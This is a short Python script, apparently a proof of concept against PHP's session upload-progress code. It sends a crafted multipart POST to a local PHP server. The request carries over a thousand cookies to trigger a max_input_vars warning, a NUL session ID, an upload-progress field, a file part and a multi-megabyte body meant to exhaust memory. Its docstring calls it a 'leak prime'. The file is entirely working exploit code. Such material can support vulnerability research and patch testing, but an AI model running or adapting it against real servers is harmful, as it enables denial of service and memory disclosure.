#!/usr/bin/env python3
"""Leak prime whose headers_sent comes from a cookie max_input_vars warning.

Order: PHPSESSID(NUL) -> PROGRESS (early_find_sid parses 1001+ cookies,
warning -> headers_sent=1) -> file (FILE_START: new id, send_cookie=1,
reset_id fails) -> huge OOM.

usage: send_a_cookie.py NCOOKIES HUGE_MB [NAME_LEN] [VAL_LEN]
"""
import socket,sys
NC=int(sys.argv[1]) if len(sys.argv)>1 else 1001
HUGE=int(sys.argv[2]) if len(sys.argv)>2 else 12
NL=int(sys.argv[3]) if len(sys.argv)>3 else 2
VL=int(sys.argv[4]) if len(sys.argv)>4 else 1
BND=b'S'*17
name=(b'a'*NL if NL>=1 else b'a')
val=(b'v'*VL if VL>=0 else b'')
cookie=(name+b'='+val+b';')*NC
parts=[{'name':'PHPSESSID','data':b'\x00'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},
       {'name':'f','filename':'a.txt','data':b'A'*64},
       {'name':'big','data':b'B'*(HUGE*1024*1024)}]
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\n'
   f'Content-Type: multipart/form-data; boundary={BND.decode()}\r\n'
   f'Content-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
h=h.replace(b'\r\nHost: 127.0.0.1:8088\r\n', b'\r\nHost: 127.0.0.1:8088\r\nCookie: '+cookie+b'\r\n')
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
data=b''
try:
    while True:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError: pass
s.close()
print(data.split(b'\r\n\r\n',1)[-1][:200].decode('latin1','replace'))
